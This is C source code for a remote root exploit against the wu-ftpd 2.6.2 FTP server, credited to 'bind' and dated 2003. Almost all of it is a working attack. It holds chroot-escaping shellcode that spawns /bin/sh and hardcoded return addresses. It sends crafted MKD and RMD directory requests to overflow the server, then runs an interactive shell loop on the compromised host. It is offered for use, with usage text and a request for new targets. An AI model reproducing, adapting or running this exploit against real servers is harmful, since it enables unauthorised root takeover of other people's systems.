/*
 * wu-realpath.c - wuftpd 2.6.2 remote root exploit
 * written by bind <bind@insidiae.org>
 * august 5th, 2003
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE, DO NOT DISTRIBUTE
 *
 * usage: ./wu-realpath [-u <user>] [-p <pass>] [-t <version>] target
 *      -u               username to login to ftp server
 *      -p               password to login to ftp server
 *      -t               target wuftpd version -t0 for list
 *      -d               specify the writeable dir 
 *      target           host running vulnerable wuftpd
 *
 * notes:
 *   - full path of home directory causes dependencies on size calculation
 *   - currently re-align username to create directories correctly
 *   - no reason why this couldn't work on non-linux
 *   - to find new targets, examine stack and look for our 0x41 nops
 *   - email me new targets :P
 *
 * thx to the following:
 *   - noir
 *   - eugene
 */

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define  HOME         "/home"

#define  dprintf      if(debug) printf
#define  _set(x, y)   memset(&(x), y, sizeof(x));
#define  _death(a)    do{ perror(#a "()"); exit(-1); }while(0)

int debug = 0;

int      shell(int sd);
void     usage(char *name);
void     wu_dir(int sockfd);
void     wu_chdir(int sockfd);
u_long   resolve(char *hostname);
void     boom(int sockfd, int flag);
int      connection(char *host, int port);
int      escape_ff(u_char *src, u_char *dst);
int      login(int sd, char *user, char *pass);

unsigned char readcode[] =
  "\x41\x41\x41\x41\x33\xdb\xf7\xe3\xb0\x03\x8b\xcc\x68\xb2\xff\xcd"
  "\x80\xff\xe4\xeb\xec";
  
const unsigned char neo_chroot[] =
  "\x31\xdb"                            /* xorl %ebx, %ebx       */
  "\x8d\x43\x17"                        /* leal 0x17(%ebx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x31\xd2"                            /* xorl %edx, %edx       */
  "\x52"                                /* pushl %edx            */
  "\x68\x2e\x2e\x2e\x2e"                /* pushl $0x2e2e2e2e     */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x66\xb9\xed\x01"                    /* movw $0x1ed, %cx      */
  "\x8d\x42\x27"                        /* leal 0x27(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x8d\x42\x3d"                        /* leal 0x3d(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x31\xf6"                            /* xorl %esi, %esi       */
  "\x52"                                /* pushl %edx            */
  "\x66\x68\x2e\x2e"                    /* pushw $0x2e2e         */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x8d\x42\x0c"                        /* leal 0xc(%edx), %eax  */
  "\xcd\x80"                            /* int $0x80             */
  "\x52"                                /* pushl %edx            */
  "\x6a\x2e"                            /* push $0x2e            */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x83\xec\x58"                        /* subl $0x58, %ecx      */
  "\x89\xe1"                            /* movl %esp, %ecx       */
  "\x8d\x42\x6a"                        /* leal 0x6a(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x8b\x79\x04"                        /* movl 0x4(%ecx), %edi  */
  "\x83\xff\x02"                        /* cmpl $0x2, %edi       */
  "\x74\x06"                            /* je <hacked>           */
  "\x46"                                /* incl %esi             */
  "\x83\xfe\x64"                        /* cmpl $0x64, %esi      */
  "\x7c\xd7"                            /* jl <loop>             */
  "\x52"                                /* pushl %edx            */
  "\x6a\x2e"                            /* push $0x2e            */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x8d\x42\x3d"                        /* leal 0x3d(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x52"                                /* pushl %edx            */
  "\x68\x2f\x2f\x73\x68"                /* pushl $0x68732f2f     */
  "\x68\x2f\x62\x69\x6e"                /* pushl $0x6e69622f     */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x52"                                /* pushl %edx            */
  "\x53"                                /* pushl %ebx            */
  "\x89\xe1"                            /* movl %esp, %ecx       */
  "\x8d\x42\x0b"                        /* leal 0xb(%edx), %eax  */
  "\xcd\x80";                           /* int $0x80             */

typedef struct version_s {
  u_long  retaddr;
  char    *name;
} version_s;

const version_s versions[] = {
  { 0xbfffd778, "debian / wu-ftpd 2.6.2(1) compiled" },
  { 0x41414141, "nudge" }
};

char      *user;
char      dir[4096];
const version_s *version;
const int num_ver = sizeof(versions) / sizeof(*versions);

int
main(int argc, char **argv)
{
  int opt, i, ver, sockfd;
  char *pass, *target, *prog;

  ver = 0;
  _set(dir, 0);
  prog = argv[0];
  setvbuf(stdout, 0, _IONBF, 0);

  printf("wu-realpath.c - wuftpd 2.6.2 remote root exploit\n"
      "written by bind <bind@insidiae.org>\n");
  
  opterr = 0;
  while((opt = getopt(argc, argv, "u:p:t:d:")) != EOF) {
    switch(opt) {
      case 'u':
        user = optarg;
        break;
      case 'p':
        pass = optarg;
        break;
      case 't':
        ver = atoi(optarg) - 1;
        break;
      case 'd':
	snprintf(dir, sizeof(dir) - 1, "%s", optarg);
	break;
      default:
        usage(prog);
        break;
    }
  }

  argv += optind;
  target = argv[0];

  if(ver < 0 || ver >= num_ver) {
    printf("\ntargets:\n");
    for(i = 0; i < num_ver; i++)
      printf("  -t%d  %s\n", i + 1, versions[i].name);
    exit(0);
  }

  if(!target)
    usage(prog);

  version = versions + ver;

  if(!dir[0])
    snprintf(dir, sizeof(dir) - 1, "%s/%s", HOME, user);

  printf("\nexploiting %s\n", version->name);
  printf("using %d byte shellcode\n\n", strlen(neo_chroot));
 
  if((sockfd = connection(target, 21)) < 0)
    exit(-1);

  if(login(sockfd, user, pass) < 0)
    exit(-1);

  printf("changing dir: %s\n", dir);
  printf("creating evil directory..");

  wu_chdir(sockfd);

  for(i = 0; i < 15; i++) 
    wu_dir(sockfd);

  printf("complete\n\n");
  
  boom(sockfd, 0);

  close(sockfd);
    
  if((sockfd = connection(target, 21)) < 0)
    exit(-1);

  if(login(sockfd, user, pass) < 0)
    exit(-1);

  printf("changing dir: %s\n", dir);
  printf("removing evil directory..");

  getchar();
  
  wu_chdir(sockfd);
  
  for(i = 0; i < 15; i++) 
    wu_dir(sockfd);

  printf("complete\n");

  boom(sockfd, 1);

  printf("\ncross the fingers..\n");
 
  send(sockfd, neo_chroot, strlen(neo_chroot), 0);

  sleep(1);

  shell(sockfd);
}

void
boom(int sockfd, int flag)
{
  int align, i, s, size, rem, c = 0;
  char *boomdir, *t, *tdir;
  char buf[1024 * 8], tmp[1024 * 8], dirback[4096];

  size = 256 - strlen(dir);
  memcpy(dirback, dir, strlen(dir));

  t = strtok(dirback, "/");

  do {
    if(t) {
      tdir = t;
      c++;
    }

    t = strtok(NULL, "/");

  } while(t != NULL);

  s = strlen(tdir) + (c + 2);

  if(c == 1)
    s = (strlen(tdir) * 4) + 3;

  if(s >= 4) {
    rem = s % 4;
    rem = 4 - rem;

    if(rem == 1)
      align = 3;
    else
      align = rem - 2;
  } else {
    if(s == 1)
      align = 3;
    else
      align = s - 2;
  }

  boomdir = (char *) malloc(size);
  memset(boomdir, 0, size);

  _set(buf, 0);
  _set(tmp, 0);

  memset(boomdir, 0x41, size - 1);

  for(i = 0 + align; i < size - 12; i += 4)
    *(long *)&boomdir[i] = version->retaddr;
  
  if(!flag)
    snprintf(buf, sizeof(buf) - 1, "MKD %s\r\n", boomdir);
  else
    snprintf(buf, sizeof(buf) - 1, "RMD %s\r\n", boomdir);

  escape_ff(buf, tmp);

  send(sockfd, tmp, strlen(tmp), 0);
  dprintf("SEND: %s\n", tmp);
  
  _set(buf, 0);
  recv(sockfd, buf, sizeof(buf), 0);
  dprintf("RECV: %s\n", buf);

  sleep(1);
} 

void
wu_chdir(int sockfd)
{
  char buf[4096];

  _set(buf, 0);

  snprintf(buf, sizeof(buf) - 1, "CWD %s\r\n", dir);
  send(sockfd, buf, strlen(buf), 0);

  recv(sockfd, buf, sizeof(buf), 0);
}

void
wu_dir(int sockfd)
{
  char dir[256], buf[1024 * 8], tmp[1024 * 8];

  _set(buf, 0);
  _set(tmp, 0);
  _set(dir, 0);

  memset(dir, 0x41, sizeof(dir) - 1);
  memcpy(dir + 200, readcode, strlen(readcode));
  
  snprintf(buf, sizeof(buf) - 1, "MKD %s\r\n", dir);
  
  escape_ff(buf, tmp);
  send(sockfd, tmp, strlen(tmp), 0);
  dprintf("SEND: %s\n", buf);
  
  _set(buf, 0);
  recv(sockfd, buf, sizeof(buf), 0);
  dprintf("RECV: %s\n", buf);

  _set(buf, 0);
  snprintf(buf, sizeof(buf) - 1, "CWD %s\r\n", dir);
  
  escape_ff(buf, tmp);
  send(sockfd, tmp, strlen(tmp), 0);
  dprintf("SEND: %s\n", buf);
  
  _set(buf, 0);
  recv(sockfd, buf, sizeof(buf), 0);
  dprintf("RECV: %s\n", buf);
}  
  

int
connection(char *host, int port)
{
  int sockfd;
  struct sockaddr_in sin;

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("socket()");
    return(-1);
  }

  sin.sin_port = htons(port);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = resolve(host);

  if(connect(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
    perror("connect()");
    return(-1);
  }

  return(sockfd);
}

int 
login(int sd, char *user, char *pass)
{
  char sendbuf[1024], recvbuf[1024];

  // get wu ftpd banner
  _set(recvbuf, 0);
  read(sd, recvbuf, sizeof(recvbuf));
  
  _set(sendbuf, 0);
  snprintf(sendbuf, sizeof(sendbuf), "USER %s\r\n", user);
  write(sd, sendbuf, strlen(sendbuf));

  read(sd, recvbuf, sizeof(recvbuf));

  _set(sendbuf, 0);
  snprintf(sendbuf, sizeof(sendbuf), "PASS %s\r\n", pass);
  write(sd, sendbuf, strlen(sendbuf));

  read(sd, recvbuf, sizeof(recvbuf));

  if (strstr(recvbuf, "230"))
    return (0);

  printf("error: login failed: %s\n", recvbuf);
  
  return (-1);
}


int 
escape_ff(u_char * src, u_char * dst)
{
  do {
    if(*src == 0xff)
      *dst++ = *src;
    *dst++ = *src;
  } while (*src++);

  return (strlen(dst));
}

int 
shell(int sd)
{
  const char cmd[] = "/bin/uname -a; /usr/bin/id\n";

  char data[8064];
  fd_set set;
  int n, i;

  putchar('\n');

  n = write(sd, cmd, strlen(cmd));
  if (n != (signed) strlen(cmd)) {
    perror("write()");
    return(-1);
  }

  for(i = 0; i < 2; i++) {
    _set(data, 0);
    n = read(sd, data, sizeof(data));
    if (n == -1) {
      perror("read()");
      return (-1);
    }
    data[n] = '\0';
    write(1, data, n);
  }


  for (;;) {
    FD_ZERO(&set);
    FD_SET(0, &set);
    FD_SET(sd, &set);

    n = select(sd + 1, &set, NULL, NULL, NULL);
    if (n == -1)
      _death(select);

    if (FD_ISSET(0, &set))
      if (forward(0, sd))
        break;

    if (FD_ISSET(sd, &set))
      if (forward(sd, 1))
        break;
  }
  return (1);
}


int 
forward(int from, int to)
{
  char data[1024];
  int n, m;

  n = read(from, data, sizeof(data));
  
  if(!n)
    return (-1);
  
  if (n == -1)
    _death(read);
  
  m = write(to, data, n);
 
  if(m != n)
    _death(write);
  
  return (0);
}

void
usage(char *name)
{
  printf("usage: %s [-u <user>] [-p <pass>] [-t <version>] [-d <dir>] target\n"
      "       -u\tusername to login to ftp server\n"
      "       -p\tpassword to login to ftp server\n"
      "       -t\ttarget wuftpd version -t0 for list\n"
      "       -d\tspecify the writeable dir\n"
      "       target\thost running vulnerable wuftpd\n", name);
  exit(-1);
}


u_long resolve(char *hostname)
{
  struct sockaddr_in sin;
  struct hostent *hent;

  if(!(hent = gethostbyname(hostname)))
    return(0);

  bzero((char *) &sin, sizeof(sin));
  memcpy((char *) &sin.sin_addr, hent->h_addr, hent->h_length);

  return(sin.sin_addr.s_addr);
}
